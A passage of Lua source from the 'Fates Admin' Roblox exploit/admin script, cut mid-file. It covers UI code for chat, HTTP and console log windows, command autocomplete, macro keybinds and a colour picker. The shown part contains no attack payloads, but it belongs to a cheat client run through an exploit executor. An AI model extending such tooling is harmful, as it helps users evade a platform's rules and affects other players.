Utils.Click(Console.Close, "TextColor3");

Utils.Click(GlobalChatLogs.Clear, "BackgroundColor3")
Utils.Click(GlobalChatLogs.Save, "BackgroundColor3")
Utils.Click(GlobalChatLogs.Toggle, "BackgroundColor3")
Utils.Click(GlobalChatLogs.Close, "TextColor3")

Utils.Click(HttpLogs.Clear, "BackgroundColor3")
Utils.Click(HttpLogs.Save, "BackgroundColor3")
Utils.Click(HttpLogs.Toggle, "BackgroundColor3")
Utils.Click(HttpLogs.Close, "TextColor3")

AddConnection(CConnect(Commands.Close.MouseButton1Click, function()
    local Tween = Utils.TweenAllTrans(Commands, .25)

    CWait(Tween.Completed);
    Commands.Visible = false
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(Commands.Search, "Text"), function()
    local Text = Commands.Search.Text
    local Children = GetChildren(Commands.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (IsA(v, "Frame")) then
            local Command = v.CommandText.Text
            v.Visible = Sfind(lower(Command), Text, 1, true)
        end
    end
    Commands.Frame.List.CanvasSize = UDim2.fromOffset(0, Commands.Frame.List.UIListLayout.AbsoluteContentSize.Y)
end), Connections.UI, true);

AddConnection(CConnect(ChatLogs.Close.MouseButton1Click, function()
    local Tween = Utils.TweenAllTrans(ChatLogs, .25)

    CWait(Tween.Completed);
    ChatLogs.Visible = false
end), Connections.UI, true);
AddConnection(CConnect(GlobalChatLogs.Close.MouseButton1Click, function()
    local Tween = Utils.TweenAllTrans(GlobalChatLogs, .25)

    CWait(Tween.Completed);
    GlobalChatLogs.Visible = false
end), Connections.UI, true);
AddConnection(CConnect(HttpLogs.Close.MouseButton1Click, function()
    local Tween = Utils.TweenAllTrans(HttpLogs, .25)

    CWait(Tween.Completed);
    HttpLogs.Visible = false
end), Connections.UI, true);

AddConnection(CConnect(Console.Close.MouseButton1Click, function()
    local Tween = Utils.TweenAllTrans(Console, .25)

    CWait(Tween.Completed);
    Console.Visible = false
end), Connections.UI, true);

ChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
GlobalChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
HttpLogs.Toggle.Text = _L.HttpLogsEnabled and "Enabled" or "Disabled"

AddConnection(CConnect(ChatLogs.Toggle.MouseButton1Click, function()
    _L.ChatLogsEnabled = not _L.ChatLogsEnabled
    ChatLogs.Toggle.Text = _L.ChatLogsEnabled and "Enabled" or "Disabled"
end), Connections.UI, true);
AddConnection(CConnect(GlobalChatLogs.Toggle.MouseButton1Click, function()
    _L.GlobalChatLogsEnabled = not _L.GlobalChatLogsEnabled
    GlobalChatLogs.Toggle.Text = _L.GlobalChatLogsEnabled and "Enabled" or "Disabled"
end), Connections.UI, true);
AddConnection(CConnect(HttpLogs.Toggle.MouseButton1Click, function()
    _L.HttpLogsEnabled = not _L.HttpLogsEnabled
    HttpLogs.Toggle.Text = _L.HttpLogsEnabled and "Enabled" or "Disabled"
end), Connections.UI, true);

AddConnection(CConnect(ChatLogs.Clear.MouseButton1Click, function()
    Utils.ClearAllObjects(ChatLogs.Frame.List)
    ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
end), Connections.UI, true);
AddConnection(CConnect(GlobalChatLogs.Clear.MouseButton1Click, function()
    Utils.ClearAllObjects(GlobalChatLogs.Frame.List)
    GlobalChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
end), Connections.UI, true);
AddConnection(CConnect(HttpLogs.Clear.MouseButton1Click, function()
    Utils.ClearAllObjects(HttpLogs.Frame.List)
    HttpLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, 0)
end), Connections.UI, true);

AddConnection(CConnect(Console.Clear.MouseButton1Click, function()
    Utils.ClearAllObjects(Console.Frame.List);
    Console.Frame.List.CanvasSize = UDim2.fromOffset(0, 0);
end), Connections.UI, true);

do
    local ShowWarns, ShowErrors, ShowOutput = true, true, true
    AddConnection(CConnect(Console.Warns.MouseButton1Click, function()
        ShowWarns = not ShowWarns
        local Children = GetChildren(Console.Frame.List);
        for i = 1, #Children do
            local v = Children[i]
            if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "W") then
                v.Visible = ShowWarns
            end
        end
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        Console.Warns.Text = ShowWarns and "Hide Warns" or "Show Warns"
    end), Connections.UI, true);
    AddConnection(CConnect(Console.Errors.MouseButton1Click, function()
        ShowErrors = not ShowErrors
        local Children = GetChildren(Console.Frame.List);
        for i = 1, #Children do
            local v = Children[i]
            if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "E") then
                v.Visible = ShowErrors
            end
        end
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        Console.Errors.Text = ShowErrors and "Hide Errors" or "Show Errors"
    end), Connections.UI, true);
    AddConnection(CConnect(Console.Output.MouseButton1Click, function()
        ShowOutput = not ShowOutput
        local Children = GetChildren(Console.Frame.List);
        for i = 1, #Children do
            local v = Children[i]
            if (not IsA(v, "UIListLayout") and sub(v.Name, 1, 1) == "P") then
                v.Visible = ShowOutput
            end
        end
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        Console.Output.Text = ShowOutput and "Hide Output" or "Show Output"
    end), Connections.UI, true);
end

AddConnection(CConnect(GetPropertyChangedSignal(ChatLogs.Search, "Text"), function()
    local Text = ChatLogs.Search.Text
    local Children = GetChildren(ChatLogs.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            local Message = v.Text
            v.Visible = Sfind(lower(Message), Text, 1, true);
        end
    end
    ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, ChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(GlobalChatLogs.Search, "Text"), function()
    local Text = GlobalChatLogs.Search.Text

    local Children = GetChildren(GlobalChatLogs.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            local Message = v.Text

            v.Visible = Sfind(lower(Message), Text, 1, true)
        end
    end
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(HttpLogs.Search, "Text"), function()
    local Text = HttpLogs.Search.Text

    local Children = GetChildren(HttpLogs.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            local Message = v.Text
            v.Visible = Sfind(lower(Message), Text, 1, true)
        end
    end
end), Connections.UI, true);

AddConnection(CConnect(GetPropertyChangedSignal(Console.Search, "Text"), function()
    local Text = Console.Search.Text
    local Children = GetChildren(Console.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            local Message = v.Text
            v.Visible = Sfind(lower(Message), Text, 1, true)
        end
    end
    Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y)
end), Connections.UI, true);


AddConnection(CConnect(ChatLogs.Save.MouseButton1Click, function()
    local GameName = Services.MarketplaceService.GetProductInfo(Services.MarketplaceService, game.PlaceId).Name
    local String =  format("Fates Admin Chatlogs for %s (%s)\n\n", GameName, os.date());
    local TimeSaved = gsub(tostring(os.date("%x")), "/", "-") .. " " .. gsub(tostring(os.date("%X")), ":", "-");
    local Name = format("mafia-admin/chatlogs/%s (%s).txt", GameName, TimeSaved);
    local Children = GetChildren(ChatLogs.Frame.List);
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            String = format("%s%s\n", String, v.Text);
        end
    end
    writefile(Name, String);
    Utils.Notify(LocalPlayer, "Saved", "Chat logs saved!");
end), Connections.UI, true);

AddConnection(CConnect(HttpLogs.Save.MouseButton1Click, function()
    local Children = GetChildren(HttpLogs.Frame.List);
    local Logs =  format("Fates Admin HttpLogs for %s\n\n", os.date());
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            Logs = format("%s%s\n", Logs, v.Text);
        end
    end
    if (not isfolder("mafia-admin/httplogs")) then
        makefolder("mafia-admin/httplogs");
    end
    writefile(format("mafia-admin/httplogs/HttpLogs for %s", gsub(tostring(os.date("%X")), ":", "-")) .. ".txt", gsub(Logs, "%b<>", ""));
    Utils.Notify(LocalPlayer, "Saved", "Http logs saved!");
end), Connections.UI, true);

AddConnection(CConnect(Console.Save.MouseButton1Click, function()
    local GameName = Services.MarketplaceService.GetProductInfo(Services.MarketplaceService, game.PlaceId).Name
    local TimeSaved = gsub(tostring(os.date("%x")), "/", "-") .. " " .. gsub(tostring(os.date("%X")), ":", "-");
    local Children = GetChildren(Console.Frame.List);
    local String =  format("Fates Admin logs %s\nGame: %s - %d\n\n", TimeSaved, GameName, game.PlaceId);
    local Names = { ["P"] = "OUTPUT", ["W"] = "WARNING", ["E"] = "ERROR" }
    for i = 1, #Children do
        local v = Children[i]
        if (not IsA(v, "UIListLayout")) then
            String = format("%s[%s] %s\n", String, Names[sub(v.Name, 1, 1)] or "", v.Text);
        end
    end
    writefile("mafia-admin/logs.txt", String);
    Utils.Notify(LocalPlayer, "Saved", "Console Logs saved!");
end), Connections.UI, true);

-- auto correct
AddConnection(CConnect(GetPropertyChangedSignal(CommandBar.Input, "Text"), function() -- make it so that every space a players name will appear
    CommandBar.Input.Text = CommandBar.Input.Text
    local Text = CommandBar.Input.Text
    local Prediction = CommandBar.Input.Predict
    local PredictionText = Prediction.Text

    local Args = split(Text, " ")

    Prediction.Text = ""
    if (Text == "") then
        return
    end

    local FoundCommand = false
    local FoundAlias = false
    CommandArgs = CommandArgs or {}
    if (not CommandsTable[Args[1]]) then
        for _, v in next, CommandsTable do
            local CommandName = v.Name
            local Aliases = v.Aliases
            local FoundAlias
    
            if (Utils.MatchSearch(Args[1], CommandName)) then -- better search
                Prediction.Text = CommandName
                CommandArgs = v.Args or {}
                break
            end
    
            for _, v2 in next, Aliases do
                if (Utils.MatchSearch(Args[1], v2)) then
                    FoundAlias = true
                    Prediction.Text = v2
                    CommandArgs = v2.Args or {}
                    break
                end
    
                if (FoundAlias) then
                    break
                end
            end
        end
    end

    for i, v in next, Args do -- make it get more players after i space out
        if (i > 1 and v ~= "") then
            local Predict = ""
            if (#CommandArgs >= 1) then
                for i2, v2 in next, CommandArgs do
                    if (lower(v2) == "player") then
                        Predict = Utils.GetPlayerArgs(v) or Predict;
                    else
                        Predict = Utils.MatchSearch(v, v2) and v2 or Predict
                    end
                end
            else
                Predict = Utils.GetPlayerArgs(v) or Predict;
            end
            Prediction.Text = sub(Text, 1, #Text - #Args[#Args]) .. Predict
            local split = split(v, ",");
            if (next(split)) then
                for i2, v2 in next, split do
                    if (i2 > 1 and v2 ~= "") then
                        local PlayerName = Utils.GetPlayerArgs(v2)
                        Prediction.Text = sub(Text, 1, #Text - #split[#split]) .. (PlayerName or "")
                    end
                end
            end
        end
    end

    if (Sfind(Text, "\t")) then -- remove tab from preditction text also
        CommandBar.Input.Text = PredictionText
        CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 1
    end
end))


do
    local Enabled = false
    local Connection;
    local Predict;
    ToggleChatPrediction = function()
        if (_L.Frame2) then
            return
        end
        if (not Enabled) then
            local RobloxChat = LocalPlayer.PlayerGui and FindFirstChild(LocalPlayer.PlayerGui, "Chat");
            local RobloxChatBarFrame;
            if (RobloxChat) then
                local RobloxChatFrame = FindFirstChild(RobloxChat, "Frame");
                if (RobloxChatFrame) then
                    RobloxChatBarFrame = FindFirstChild(RobloxChatFrame, "ChatBarParentFrame");
                end
            end
            local PredictionClone, ChatBar
            if (RobloxChatBarFrame) then
                local Frame1 = FindFirstChild(RobloxChatBarFrame, 'Frame');
                if Frame1 then
                    local BoxFrame = FindFirstChild(Frame1, 'BoxFrame');
                    if BoxFrame then
                        _L.Frame2 = FindFirstChild(BoxFrame, 'Frame');
                        if _L.Frame2 then
                            local TextLabel = FindFirstChild(_L.Frame2, 'TextLabel');
                            ChatBar = FindFirstChild(_L.Frame2, 'ChatBar');
                            if TextLabel and ChatBar then
                                PredictionClone = InstanceNew('TextLabel');
                                PredictionClone.Font = TextLabel.Font
                                PredictionClone.LineHeight = TextLabel.LineHeight
                                PredictionClone.MaxVisibleGraphemes = TextLabel.MaxVisibleGraphemes
                                PredictionClone.RichText = TextLabel.RichText
                                PredictionClone.Text = ''
                                PredictionClone.TextColor3 = TextLabel.TextColor3
                                PredictionClone.TextScaled = TextLabel.TextScaled
                                PredictionClone.TextSize = TextLabel.TextSize
                                PredictionClone.TextStrokeColor3 = TextLabel.TextStrokeColor3
                                PredictionClone.TextStrokeTransparency = TextLabel.TextStrokeTransparency
                                PredictionClone.TextTransparency = 0.3
                                PredictionClone.TextTruncate = TextLabel.TextTruncate
                                PredictionClone.TextWrapped = TextLabel.TextWrapped
                                PredictionClone.TextXAlignment = TextLabel.TextXAlignment
                                PredictionClone.TextYAlignment = TextLabel.TextYAlignment
                                PredictionClone.Name = "Predict"
                                PredictionClone.Size = UDim2.new(1, 0, 1, 0);
                                PredictionClone.BackgroundTransparency = 1
                            end
                        end
                    end
                end
            end

            ParentGui(PredictionClone, _L.Frame2);
            Predict = PredictionClone

            Connection = AddConnection(CConnect(GetPropertyChangedSignal(ChatBar, "Text"), function() -- todo: add detection for /e
                local Text = ChatBar.Text
                local Prediction = PredictionClone
                local PredictionText = PredictionClone.Text
            
                local Args = split(concat(shift(split(Text, ""))), " ");
            
                Prediction.Text = ""
                if (not startsWith(Text, Prefix)) then
                    return
                end
            
                local FoundCommand = false
                local FoundAlias = false
                CommandArgs = CommandArgs or {}
                if (not rawget(CommandsTable, Args[1])) then
                    for _, v in next, CommandsTable do
                        local CommandName = v.Name
                        local Aliases = v.Aliases
                        local FoundAlias
                
                        if (Utils.MatchSearch(Args[1], CommandName)) then -- better search
                            Prediction.Text = Prefix .. CommandName
                            FoundCommand = true
                            CommandArgs = v.Args or {}
                            break
                        end
                
                        for _, v2 in next, Aliases do
                            if (Utils.MatchSearch(Args[1], v2)) then
                                FoundAlias = true
                                Prediction.Text = v2
                                CommandArgs = v.Args or {}
                                break
                            end
                
                            if (FoundAlias) then
                                break
                            end
                        end
                    end
                end
            
                for i, v in next, Args do -- make it get more players after i space out
                    if (i > 1 and v ~= "") then
                        local Predict = ""
                        if (#CommandArgs >= 1) then
                            for i2, v2 in next, CommandArgs do
                                if (lower(v2) == "player") then
                                    Predict = Utils.GetPlayerArgs(v) or Predict;
                                else
                                    Predict = Utils.MatchSearch(v, v2) and v2 or Predict
                                end
                            end
                        else
                            Predict = Utils.GetPlayerArgs(v) or Predict;
                        end
                        Prediction.Text = sub(Text, 1, #Text - #Args[#Args]) .. Predict
                        local split = split(v, ",");
                        if (next(split)) then
                            for i2, v2 in next, split do
                                if (i2 > 1 and v2 ~= "") then
                                    local PlayerName = Utils.GetPlayerArgs(v2)
                                    Prediction.Text = sub(Text, 1, #Text - #split[#split]) .. (PlayerName or "")
                                end
                            end
                        end
                    end
                end
            
                if (Sfind(Text, "\t")) then -- remove tab from preditction text also
                    ChatBar.Text = PredictionText
                    ChatBar.CursorPosition = #ChatBar.Text + 2
                end
            end))
            Enabled = true
            return ChatBar
        else
            Disconnect(Connection);
            Destroy(Predict);
            Enabled = false
        end
        return _L.Frame2
    end

    if (CurrentConfig.ChatPrediction) then
        delay(2, ToggleChatPrediction);
    end
end

local ConfigUILib = {}
do
    local GuiObjects = ConfigElements
    local PageCount = 0
    local SelectedPage
    local UserInputService = Services.UserInputService

    local Colors = {
        ToggleEnabled = Color3.fromRGB(5, 5, 6);
        Background = Color3.fromRGB(32, 33, 36);
        ToggleDisabled = Color3.fromRGB(27, 28, 31);
    }

    local ColorElements = ConfigElements.Elements.ColorElements
    local Overlay = ColorElements.Overlay
    local OverlayMain = Overlay.Main
    local ColorPicker = OverlayMain.ColorPicker
    local Settings = OverlayMain.Settings
    local ClosePicker = OverlayMain.Close
    local ColorCanvas = ColorPicker.ColorCanvas
    local ColorSlider = ColorPicker.ColorSlider
    local ColorGradient = ColorCanvas.ColorGradient
    local DarkGradient = ColorGradient.DarkGradient
    local CanvasBar = ColorGradient.Bar
    local RainbowGradient = ColorSlider.RainbowGradient
    local SliderBar = RainbowGradient.Bar
    local CanvasHitbox = ColorCanvas.Hitbox
    local SliderHitbox = ColorSlider.Hitbox
    local ColorPreview = Settings.ColorPreview
    local ColorOptions = Settings.Options
    local RedTextBox = ColorOptions.Red.TextBox
    local BlueTextBox = ColorOptions.Blue.TextBox
    local GreenTextBox = ColorOptions.Green.TextBox
    local RainbowToggle = ColorOptions.Rainbow

    local function UpdateClone()
        ConfigUIClone = Clone(ConfigUI);
    end

    function ConfigUILib.NewPage(Title)
        local Page = Clone(GuiObjects.Page.Container);
        local TextButton = Clone(GuiObjects.Page.TextButton);

        Page.Visible = true
        TextButton.Visible = true

        Utils.Click(TextButton, "BackgroundColor3")
            
        if PageCount == 0 then
            SelectedPage = Page
        end

        AddConnection(CConnect(TextButton.MouseButton1Click, function()
            if SelectedPage.Name ~= TextButton.Name then          
                SelectedPage = Page
                ConfigUI.Container.UIPageLayout:JumpTo(SelectedPage)
            end
        end))
        
        Page.Name = Title
        TextButton.Name = Title
        TextButton.Text = Title
        
        Page.Parent = ConfigUI.Container
        TextButton.Parent = ConfigUI.Selection
        
        PageCount = PageCount + 1


        UpdateClone()

        local function GetKeyName(KeyCode)
            local _, Stringed = pcall(UserInputService.GetStringForKeyCode, UserInputService, KeyCode);
            local IsEnum = Stringed == ""
            return (not IsEnum and _) and Stringed or split(tostring(KeyCode), ".")[3], (IsEnum and not _);
        end

        local PageLibrary = {}

        function PageLibrary.CreateMacroSection(MacrosToAdd, Callback)
            local Macro = Clone(GuiObjects.Elements.Macro);
            local MacroPage = Macro.MacroPage
            local Selection = Page.Selection
            
            Selection.ClearAllChildren(Selection);
            for i,v in next, GetChildren(MacroPage) do
                v.Parent = Selection
            end
            Selection.Container.Visible = true
            local CommandsList = Selection.Container.Commands.Frame.List
            local CurrentMacros = Selection.Container.CurrentMacros
            local AddMacro = Selection.AddMacro
            local BindA, CommandA, ArgsA = AddMacro.Bind, AddMacro.Command, AddMacro["z Args"]
            local Add = AddMacro.AddMacro
            local Keybind = {};
            local Enabled = false
            local Connection
            
            local OnClick = function()
                Enabled = not Enabled
                if Enabled then
                    BindA.Text = "..."
                    local OldShiftLock = LocalPlayer.DevEnableMouseLock
                    LocalPlayer.DevEnableMouseLock = false
                    Keybind = {}
                    Connection = AddConnection(CConnect(UserInputService.InputBegan, function(Input, Processed)
                        if not Processed and Input.UserInputType == Enum.UserInputType.Keyboard then
                            local Input2, Proccessed2;
                            CThread(function()
                                Input2, Proccessed2 = CWait(UserInputService.InputBegan);
                            end)()
                            CWait(UserInputService.InputEnded);
                            if (Input2 and not Processed) then
                                local KeyName, IsEnum = GetKeyName(Input.KeyCode);
                                local KeyName2, IsEnum2 = GetKeyName(Input2.KeyCode); 
                                BindA.Text = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
                                Keybind[1] = Input.KeyCode
                                Keybind[2] = Input2.KeyCode
                            else
                                local KeyName = GetKeyName(Input.KeyCode);
                                BindA.Text = KeyName
                                Keybind[1] = Input.KeyCode
                                Keybind[2] = nil
                            end
                            LocalPlayer.DevEnableMouseLock = OldShiftLock
                        else
                            BindA.Text = "Bind"
                        end
                        Enabled = false
                        Disconnect(Connection);
                    end));
                else
                    BindA.Text = "Bind"
                    Disconnect(Connection);
                end
            end

            AddConnection(CConnect(BindA.MouseButton1Click, OnClick));
            AddConnection(CConnect(Add.MouseButton1Click, function()
                if (BindA.Text == "Bind") then
                    Utils.Notify(nil, nil, "You must assign a keybind");
                    return
                end
                if (not CommandsTable[CommandA.Text]) then
                    Utils.Notify(nil, nil, "You must add a command");
                    return
                end
                Callback(Keybind, CommandA.Text, ArgsA.Text);
            end));

            local Focused = false
            local MacroSection = {
                CommandsList = CommandsList,
                AddCmd = function(Name) 
                    local Command = Clone(Macro.Command);
                    Command.Name = Name
                    Command.Text = Name
                    Command.Parent = CommandsList
                    Command.Visible = true
                    AddConnection(CConnect(Command.MouseButton1Click, function()
                        CommandA.Text = Name
                        ArgsA.CaptureFocus(ArgsA);
                        Focused = true
                        CWait(ArgsA.FocusLost);
                        CWait(UserInputService.InputBegan);
                        Focused = false
                        wait(.2);
                        if (not Focused) then
                            OnClick();
                        end
                    end))
                end,
                AddMacro = function(MacroName, Bind)
                    local NewMacro = Clone(Macro.EditMacro);
                    NewMacro.Bind.Text = Bind
                    NewMacro.Macro.Text = MacroName
                    NewMacro.Parent = CurrentMacros
                    NewMacro.Visible = true

                    Utils.Thing(NewMacro.Bind);
                    Utils.Thing(NewMacro.Macro);

                    FindFirstChild(NewMacro, "Remove").Name = "Delete"
                    AddConnection(CConnect(NewMacro.Delete.MouseButton1Click, function()
                        CWait(Utils.TweenAllTrans(NewMacro, .25).Completed);
                        Destroy(NewMacro);
                        for i = 1, #Macros do
                            if (Macros[i].Command == split(MacroName, " ")[1]) then
                                Macros[i] = nil
                            end
                        end
                        local TempMacros = clone(Macros);
                        for i, v in next, TempMacros do
                            for i2, v2 in next, v.Keys do
                                TempMacros[i]["Keys"][i2] = split(tostring(v2), ".")[3]
                            end
                        end
                        SetConfig({Macros=TempMacros});
                    end))
                end
            }

            for i, v in next, MacrosToAdd do
                local Suc, Err = pcall(concat, v.Args, " ");
                if (not Suc) then
                    SetConfig({Macros={}});
                    Utils.Notify(LocalPlayer, "Error", "Macros were reset due to corrupted data")
                    break;
                end
                local KeyName, IsEnum = GetKeyName(v.Keys[1]);
                local Formatted;
                if (v.Keys[2]) then
                    local KeyName2, IsEnum2 = GetKeyName(v.Keys[2]); 
                    Formatted = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
                else
                    Formatted = KeyName
                end
                MacroSection.AddMacro(v.Command .. " " .. concat(v.Args, " "), Formatted);
            end

            return MacroSection
        end

        function PageLibrary.NewSection(Title)
            local Section = Clone(GuiObjects.Section.Container);
            local SectionOptions = Section.Options
            local SectionUIListLayout = SectionOptions.UIListLayout

            Section.Visible = true

            Utils.SmoothScroll(Section.Options, .14)
            Section.Title.Text = Title
            Section.Parent = Page.Selection
            
            
            SectionOptions.CanvasSize = UDim2.fromOffset(0,0) --// change
            AddConnection(CConnect(GetPropertyChangedSignal(SectionUIListLayout, "AbsoluteContentSize"), function()
                SectionOptions.CanvasSize = UDim2.fromOffset(0, SectionUIListLayout.AbsoluteContentSize.Y + 5);
            end));
            
            UpdateClone();

            local ElementLibrary = {}


            function ElementLibrary.Toggle(Title, Enabled, Callback)
                local Toggle = Clone(GuiObjects.Elements.Toggle);
                local Container = Toggle.Container

                local Switch = Container.Switch
                local Hitbox = Container.Hitbox
                
                if not Enabled then
                    Switch.Position = UDim2.fromOffset(2, 2)
                    Container.BackgroundColor3 = Colors.ToggleDisabled
                end
                local NoCallback = false

                local OnClick = function()
                    Enabled = not Enabled
                    
                    Utils.Tween(Switch, "Quad", "Out", .25, {
                        Position = Enabled and UDim2.new(1, -18, 0, 2) or UDim2.fromOffset(2, 2)
                    })
                    Utils.Tween(Container, "Quad", "Out", .25, {
                        BackgroundColor3 = Enabled and Colors.ToggleEnabled or Colors.ToggleDisabled
                    })
                    
                    if (not NoCallback) then
                        Callback(Enabled);
                    end
                end

                AddConnection(CConnect(Hitbox.MouseButton1Click, OnClick));
                
                Toggle.Visible = true
                Toggle.Title.Text = Title
                Toggle.Parent = Section.Options
                Utils.Thing(Toggle.Title);

                UpdateClone()

                return function()
                    NoCallback = true
                    OnClick();
                    NoCallback = false
                end
            end

            function ElementLibrary.ScrollingFrame(Title, Callback, Elements, Toggles)
                local ScrollingFrame = Clone(GuiObjects.Elements.ScrollingFrame);
                local Frame = ScrollingFrame.Frame
                local Toggle = ScrollingFrame.Toggle

                for ElementTitle, Enabled in next, Elements do
                    local NewToggle = Clone(Toggle);
                    NewToggle.Visible = true
                    NewToggle.Title.Text = ElementTitle
                    NewToggle.Plugins.Text = Enabled and (Toggles and Toggles[1] or "Enabled") or (Toggles and Toggles[2] or "Disabled");


                    Utils.Click(NewToggle.Plugins, "BackgroundColor3")

                    AddConnection(CConnect(NewToggle.Plugins.MouseButton1Click, function()
                        Enabled = not Enabled
                        NewToggle.Plugins.Text = Enabled and (Toggles and Toggles[1] or "Enabled") or (Toggles and Toggles[2] or "Disabled");

                        Callback(ElementTitle, Enabled);
                    end));

                    NewToggle.Parent = Frame.Container
                end

                Frame.Visible = true
                Frame.Title.Text = Title
                Frame.Parent = Section.Options

                for _, NewToggle in next, GetChildren(Frame.Container) do
                    if (IsA(NewToggle, "GuiObject")) then
                        Utils.Thing(NewToggle.Title);
                    end
                end

                UpdateClone()
            end

            function ElementLibrary.Keybind(Title, Bind, Callback)
                local Keybind = Clone(GuiObjects.Elements.Keybind);
                local Enabled = false
                local Connection

                Keybind.Container.Text = Bind
                Keybind.Title.Text = Title

                local Container = Keybind.Container
                AddConnection(CConnect(Container.MouseButton1Click, function()
                    Enabled = not Enabled

                    if Enabled then
                        Container.Text = "..."
                        local OldShiftLock = LocalPlayer.DevEnableMouseLock
                        -- disable shift lock so it doesn't interfere with keybind
                        LocalPlayer.DevEnableMouseLock = false
                        Connection = AddConnection(CConnect(UserInputService.InputBegan, function(Input, Processed)
                            if not Processed and Input.UserInputType == Enum.UserInputType.Keyboard then
                                local Input2, Proccessed2;
                                CThread(function()
                                    Input2, Proccessed2 = CWait(UserInputService.InputBegan);
                                end)()
                                CWait(UserInputService.InputEnded);
                                if (Input2 and not Processed) then
                                    local KeyName, IsEnum = GetKeyName(Input.KeyCode);
                                    local KeyName2, IsEnum2 = GetKeyName(Input2.KeyCode); 
                                    -- Order by if it's an enum first, example 'Shift + K' and not 'K + Shift'
                                    Container.Text = format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
                                    Callback(Input.KeyCode, Input2.KeyCode);
                                else
                                    local KeyName = GetKeyName(Input.KeyCode);
                                    Container.Text = KeyName
                                    Callback(Input.KeyCode);
                                end
                                LocalPlayer.DevEnableMouseLock = OldShiftLock
                            else
                                Container.Text = "press"
                            end
                            Enabled = false
                            Disconnect(Connection);
                        end));
                    else
                        Container.Text = "press"
                        Disconnect(Connection);
                    end
                end));

                Utils.Click(Container, "BackgroundColor3");
                Keybind.Visible = true
                Keybind.Parent = Section.Options
                UpdateClone();
            end
            
            function ElementLibrary.TextboxKeybind(Title, Bind, Callback)
                local Keybind = Clone(GuiObjects.Elements.TextboxKeybind);
                
                Keybind.Container.Text = Bind
                Keybind.Title.Text = Title
                
                local Container = Keybind.Container
                AddConnection(CConnect(GetPropertyChangedSignal(Container, "Text"), function(Key)
                    if (#Container.Text >= 1) then
                        Container.Text = sub(Container.Text, 1, 1);
                        Callback(Container.Text);
                        Container.ReleaseFocus(Container);
                    end
                end))
                
                Keybind.Visible = true
                Keybind.Parent = Section.Options
                UpdateClone();
            end

            function ElementLibrary.ColorPicker(Title, DefaultColor, Callback)
                local SelectColor = Clone(ColorElements.SelectColor);
                local CurrentColor = DefaultColor
                local Button = SelectColor.Button
                local ToHSV = DefaultColor.ToHSV
                local Color3New = Color3.new
                local Color3fromHSV = Color3.fromHSV
                local UDim2New = UDim2.new
                local clamp = math.clamp

                local H, S, V = ToHSV(DefaultColor);
                local Opened = false
                local Rainbow = false
                
                local function UpdateText()
                    RedTextBox.PlaceholderText = tostring(math.floor(CurrentColor.R * 255))
                    GreenTextBox.PlaceholderText = tostring(math.floor(CurrentColor.G * 255))
                    BlueTextBox.PlaceholderText = tostring(math.floor(CurrentColor.B * 255))
                end
                
                local function UpdateColor()
                    H, S, V = ToHSV(CurrentColor);
                    
                    SliderBar.Position = UDim2New(0, 0, H, 2);
                    CanvasBar.Position = UDim2New(S, 2, 1 - V, 2);
                    ColorGradient.UIGradient.Color = Utils.MakeGradient({
                        [1] = Color3New(1, 1, 1);
                        [2] = Color3fromHSV(H, 1, 1);
                    })
                    
                    ColorPreview.BackgroundColor3 = CurrentColor
                    UpdateText();
                end
            
                local function UpdateHue(Hue)
                    SliderBar.Position = UDim2New(0, 0, Hue, 2);
                    ColorGradient.UIGradient.Color = Utils.MakeGradient({
                        [1] = Color3New(1, 1, 1);
                        [2] = Color3fromHSV(Hue, 1, 1);
                    });
                    
                    ColorPreview.BackgroundColor3 = CurrentColor
                    UpdateText();
                end
                
                local function ColorSliderInit()
                    local Moving = false
                    
                    local function Update()
                        if Opened and not Rainbow then
                            local LowerBound = SliderHitbox.AbsoluteSize.Y
                            local Position = clamp(Mouse.Y - SliderHitbox.AbsolutePosition.Y, 0, LowerBound);
                            local Value = Position / LowerBound
                            
                            H = Value
                            CurrentColor = Color3fromHSV(H, S, V);
                            ColorPreview.BackgroundColor3 = CurrentColor
                            ColorGradient.UIGradient.Color = Utils.MakeGradient({
                                [1] = Color3New(1, 1, 1);
                                [2] = Color3fromHSV(H, 1, 1);
                            });
                            
                            UpdateText();
                            
                            local Position = UDim2.new(0, 0, Value, 2)
                            local Tween = Utils.Tween(SliderBar, "Linear", "Out", .05, {
                                Position = Position
                            });
                            
                            Callback(CurrentColor);
                            CWait(Tween.Completed);
                        end
                    end
                
                    AddConnection(CConnect(SliderHitbox.MouseButton1Down, function()
                        Moving = true
                        Update()
                    end))
                    
                    AddConnection(CConnect(UserInputService.InputEnded, function(Input)
